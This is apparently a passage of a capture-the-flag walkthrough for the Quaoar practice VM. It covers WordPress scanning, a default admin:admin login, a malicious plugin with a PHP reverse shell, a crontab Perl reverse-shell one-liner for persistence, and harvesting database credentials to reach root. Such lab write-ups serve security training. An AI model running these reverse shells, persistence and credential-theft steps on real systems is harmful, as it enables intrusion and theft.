+    <div> |</div>
+    <div> | Detected By: Css Style (Passive Detection)</div>
+    <div> |</div>
+    <div> | Version: 1.1 (80% confidence)</div>
+    <div> | Detected By: Style (Passive Detection)</div>
+    <div> |  - http://10.183.0.219/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14, Match: 'Version: 1.1'</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] Enumerating Vulnerable Plugins (via Passive Methods)</div>
+    <div>[+] Checking Plugin Versions (via Passive and Aggressive Methods)</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[i] Plugin(s) Identified:</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] mail-masta</div>
+    <div> | Location: http://10.183.0.219/wordpress/wp-content/plugins/mail-masta/</div>
+    <div> | Latest Version: 1.0 (up to date)</div>
+    <div> | Last Updated: 2014-09-19T07:52:00.000Z</div>
+    <div> |</div>
+    <div> | Detected By: Urls In Homepage (Passive Detection)</div>
+    <div> |</div>
+    <div> | [!] 2 vulnerabilities identified:</div>
+    <div> |</div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)</font>
+    </div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8609</div>
+    <div> |      - https://www.exploit-db.com/exploits/40290/</div>
+    <div> |      - https://cxsecurity.com/issue/WLB-2016080220</div>
+    <div> |</div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: Mail Masta 1.0 - Multiple SQL Injection</font>
+    </div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8740</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098</div>
+    <div> |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin</div>
+    <div> |</div>
+    <div> | Version: 1.0 (100% confidence)</div>
+    <div> | Detected By: Readme - Stable Tag (Aggressive Detection)</div>
+    <div> |  - http://10.183.0.219/wordpress/wp-content/plugins/mail-masta/readme.txt</div>
+    <div> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</div>
+    <div> |  - http://10.183.0.219/wordpress/wp-content/plugins/mail-masta/readme.txt</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</div>
+    <div> Checking Known Locations - Time: 00:00:00 &lt;======================================================================&gt; (289 / 289) 100.00% Time: 00:00:00</div>
+    <div>[+] Checking Theme Versions (via Passive and Aggressive Methods)</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[i] No themes Found.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</div>
+    <div> Checking Known Locations - Time: 00:00:04 &lt;====================================================================&gt; (2573 / 2573) 100.00% Time: 00:00:04</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[i] No Timthumbs Found.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] Enumerating Config Backups (via Passive and Aggressive Methods)</div>
+    <div> Checking Config Backups - Time: 00:00:00 &lt;=========================================================================&gt; (21 / 21) 100.00% Time: 00:00:00</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[i] No Config Backups Found.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] Enumerating DB Exports (via Passive and Aggressive Methods)</div>
+    <div> Checking DB Exports - Time: 00:00:00 &lt;=============================================================================&gt; (36 / 36) 100.00% Time: 00:00:00</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[i] No DB Exports Found.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)</div>
+    <div> Brute Forcing Attachment IDs - Time: 00:00:11 &lt;==================================================================&gt; (100 / 100) 100.00% Time: 00:00:11</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[i] No Medias Found.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] Enumerating Users (via Passive and Aggressive Methods)</div>
+    <div> Brute Forcing Author IDs - Time: 00:00:01 &lt;========================================================================&gt; (10 / 10) 100.00% Time: 00:00:01</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[i] User(s) Identified:</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">[+] admin</font>
+    </div>
+    <div> | Detected By: Author Posts - Display Name (Passive Detection)</div>
+    <div> | Confirmed By:</div>
+    <div> |  Rss Generator (Passive Detection)</div>
+    <div> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+    <div> |  Login Error Messages (Aggressive Detection)</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] wpuser</div>
+    <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+    <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] Finished: Sun Apr 14 21:38:25 2019</div>
+    <div>[+] Requests Done: 3095</div>
+    <div>[+] Cached Requests: 8</div>
+    <div>[+] Data Sent: 704.021 KB</div>
+    <div>[+] Data Received: 23.946 MB</div>
+    <div>[+] Memory used: 202.574 MB</div>
+    <div>[+] Elapsed time: 00:00:23</div>
+</div>
+<div><br /></div>
+<div>Several vulnerabilities were detected. The default 'admin' account is also available. Did some basic login tests with the username 'admin' and found that the password is also 'admin'.</div>
+<div><br /></div>
+<div>*** ADD HYDRA INFO HERE ***</div>
+<div><br /></div>
+<div>Logged in to the WordPress site with the credentials 'admin:admin'. Now that we have admin access, I used the malicious-wordpress-plugin generator (downloaded from <a href="https://github.com/wetw0rk/malicious-wordpress-plugin" target="_blank">https://github.com/wetw0rk/malicious-wordpress-plugin</a>) to create a PHP reverse shell. I had to modify the default payload to use a basic shell (since meterpreter shells are restricted during the OSCP exam).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/quaoar/malicious-wordpress-plugin# python wordpwn.py 10.183.0.222 5432 N</div>
+    <div>[*] Checking if msfvenom installed</div>
+    <div>[+] msfvenom installed</div>
+    <div>[+] Generating plugin script</div>
+    <div>[+] Writing plugin script to file</div>
+    <div>[+] Generating payload To file</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>Found 1 compatible encoders</div>
+    <div>Attempting to encode payload with 1 iterations of php/base64</div>
+    <div>php/base64 succeeded with size 4041 (iteration=0)</div>
+    <div>php/base64 chosen with final size 4041</div>
+    <div>Payload size: 4041 bytes</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] Writing files to zip</div>
+    <div>[+] Cleaning up files</div>
+    <div>[+] General Execution Location: http://(target)/wp-content/plugins/malicous/</div>
+    <div>[+] General Upload Location: http://(target)/wp-admin/plugin-install.php?tab=upload</div>
+</div>
+<div><br /></div>
+<div><img height="198" src="/assets/images/2019-04-15-hackfest2016-quaoar/DC19B820-426D-4E12-BBA4-669CB68BF13E.png" width="449" /><br /></div>
+<div><br /></div>
+<div>Once the malicious plugin was uploaded, I started a listener in Metasploit.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 &gt; use exploit/multi/handler </div>
+    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
+    <div>payload =&gt; php/reverse_php</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
+    <div>LPORT =&gt; 5432</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 0.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>msf5 exploit(multi/handler) &gt; </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5432</div>
+</div>
+<div><br /></div>
+<div>I then browsed to the plugin files and clicked the wetw0rk_maybe.php file (containing the reverse PHP shell).</div>
+<div><br /></div>
+<div><a href="http://10.183.0.219/wordpress/wp-content/plugins/malicous/">http://10.183.0.219/wordpress/wp-content/plugins/malicous/</a></div>
+<div><br /></div>
+<div><img height="240" src="/assets/images/2019-04-15-hackfest2016-quaoar/77C2AD20-5A8E-44AA-B190-E2228BDCFE3F.png" width="690" /><br /></div>
+<div><br /></div>
+<div>This resulted in a new session in Metasploit.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.219:58920) at 2019-04-15 00:38:15 -0400</div>
+</div>
+<div><br /></div>
+<div>The PHP reverse shell has a limited active period, so I worked quickly to check to see if the www-data user had a home directory and default shell defined in /etc/passwd.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>grep `whoami` /etc/passwd</div>
+    <div>www-data:x:33:33:www-data:/var/www:/bin/sh</div>
+</div>
+<div><br /></div>
+<div>Since SSH is enabled on the host, and the user has a home directory and default shell, I moved to the /var/www directory and created a .ssh directory. I created an authorized_keys file and copied my SSH public key to the file. With this, I was able to SSH to the server.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/quaoar/malicious-wordpress-plugin# ssh -i test www-data@10.183.0.219</div>
+    <div>Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div> * Documentation:  https://help.ubuntu.com/</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>  System information as of Mon Apr 15 01:05:30 EDT 2019</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>  System load:  0.01              Processes:             99</div>
+    <div>  Usage of /:   29.9% of 7.21GB   Users logged in:       0</div>
+    <div>  Memory usage: 66%               IP address for eth0:   10.183.0.219</div>
+    <div>  Swap usage:   0%                IP address for virbr0: 192.168.122.1</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>  Graph this data and manage this system at https://landscape.canonical.com/</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>New release '14.04.5 LTS' available.</div>
+    <div>Run 'do-release-upgrade' to upgrade to it.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Last login: Mon Apr 15 00:52:53 2019 from kali.homenet.dom</div>
+    <div>$</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div><br /></div>
+<div>After using SSH to connect to the host, I installed a crontab for the www-data user to continually try to connect back to my attacking machine on port 5433 (using a Perl reverse shell). Now, if I get discovered and shut out of SSH and can get back in with the reverse shell.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>SHELL=/bin/bash</div>
+    <div>PATH=/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</div>
+    <div>MAILTO=root</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># For details see man 4 crontabs</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># Example of job definition:</div>
+    <div># .---------------- minute (0 - 59)</div>
+    <div># |  .------------- hour (0 - 23)</div>
+    <div># |  |  .---------- day of month (1 - 31)</div>
+    <div># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</div>
+    <div># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</div>
+    <div># |  |  |  |  |</div>
+    <div># *  *  *  *  * command to be executed</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>#min hour day mon dow command</div>
+    <div>*/5    *    *   *   *   perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>Searching through /etc and /boot I was able to determine the system is running Ubuntu 12.04 with kernel 3.2.0-23. Searching the exploit database, there seems to be a local privilege escalation vulnerability with this version.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Esca | exploits/linux_x86-64/local/33589.c</div>
+</div>
+<div><br /></div>
+<div>I attempted to transfer the .c file to the victim, but it doesn't have gcc. Instead, I had to cross-compile the exploit on my attacking machine after installing some libraries.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>sudo apt-get install gcc-multilib g++-multilib</div>
+    <div>gcc -m32 -o 33589 33589.c</div>
+</div>
+<div><br /></div>
+<div>Unfortunately, the exploit failed to run properly on the victim.</div>
+<div><br /></div>
+<div>Decided to track back to where I dropped in to the box and look for credentials in the /var/www directory. I checked the wp-config.php file for the WordPress site and found the database credentials.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>cat wp-config.php</div>
+    <div>&lt;?php</div>
+    <div>/**</div>
+    <div> * The base configurations of the WordPress.</div>
+    <div> *</div>
+    <div> * This file has the following configurations: MySQL settings, Table Prefix,</div>
+    <div> * Secret Keys, WordPress Language, and ABSPATH. You can find more information</div>
+    <div> * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing</div>
+    <div> * wp-config.php} Codex page. You can get the MySQL settings from your web host.</div>
+    <div> *</div>
+    <div> * This file is used by the wp-config.php creation script during the</div>
+    <div> * installation. You don't have to use the web site, you can just copy this file</div>
+    <div> * to "wp-config.php" and fill in the values.</div>
+    <div> *</div>
+    <div> * @package WordPress</div>
+    <div> */</div>
+    <div>  </div>
+    <div>// ** MySQL settings - You can get this info from your web host ** //</div>
+    <div>/** The name of the database for WordPress */</div>
+    <div>define('DB_NAME', 'wordpress');</div>
+    <div>  </div>
+    <div>/** MySQL database username */</div>
+    <div>define('DB_USER', 'root');</div>
+    <div>  </div>
+    <div>/** MySQL database password */</div>
+    <div>define('DB_PASSWORD', 'rootpassword!');</div>
+    <div>  </div>
+    <div>/** MySQL hostname */</div>
+    <div>define('DB_HOST', 'localhost');</div>
+    <div><br /></div>
+    <div>[...]</div>
+</div>
+<div><br /></div>
+<div>I tried to SSH to the box using the same root password defined in the config file and it worked! Got the flag in /root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/quaoar# ssh root@10.183.0.219</div>
+    <div>root@10.183.0.219's password: </div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div> * Documentation:  https://help.ubuntu.com/</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>  System information as of Mon Apr 15 10:45:37 EDT 2019</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>  System load:  0.12              Processes:             104</div>
+    <div>  Usage of /:   30.4% of 7.21GB   Users logged in:       1</div>
+    <div>  Memory usage: 13%               IP address for eth0:   10.183.0.219</div>
+    <div>  Swap usage:   3%                IP address for virbr0: 192.168.122.1</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>  Graph this data and manage this system at https://landscape.canonical.com/</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>New release '14.04.5 LTS' available.</div>
+    <div>Run 'do-release-upgrade' to upgrade to it.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Last login: Sun Jan 15 11:23:45 2017 from desktop-g0lhb7o.snolet.com</div>
+    <div>root@Quaoar:~#</div>
+    <div>root@Quaoar:~# cat flag.txt </div>
+    <div>8e3f9ec016e3598c5eec11fd3d73f6fb</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div>*** REMOVE CRON JOB ***</div>
+<div>*** REMOVE /var/www/.ssh ***</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><span style="font-weight: bold;">Flags</span></div>
+<div><br /></div>
+<div>I found a "flag" in the /home/wpadmin directory.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Quaoar:/home/wpadmin$ cat flag.txt </div>
+    <div>2bafe61f03117ac66a73c3c514de796e</div>
+</div>
+<div><br /></div>
+<div>I found a "flag" in the php5 cron job.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Quaoar:/etc/cron.d$ cat php5 </div>
+    <div># /etc/cron.d/php5: crontab fragment for php5</div>
+    <div>#  This purges session files older than X, where X is defined in seconds</div>
+    <div>#  as the largest value of session.gc_maxlifetime from all your php.ini</div>
+    <div>#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime</div>
+    <div># Its always a good idea to check for crontab to learn more about the operating system good job you get 50! - d46795f84148fd338603d0d6a9dbf8de</div>
+    <div># Look for and purge old sessions every 30 minutes</div>
+    <div>09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] &amp;&amp; [ -d /var/lib/php5 ] &amp;&amp; find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2&gt;/dev/null \; -delete</div>
+</div>
+<div><br /></div>
+<div><br /></div>
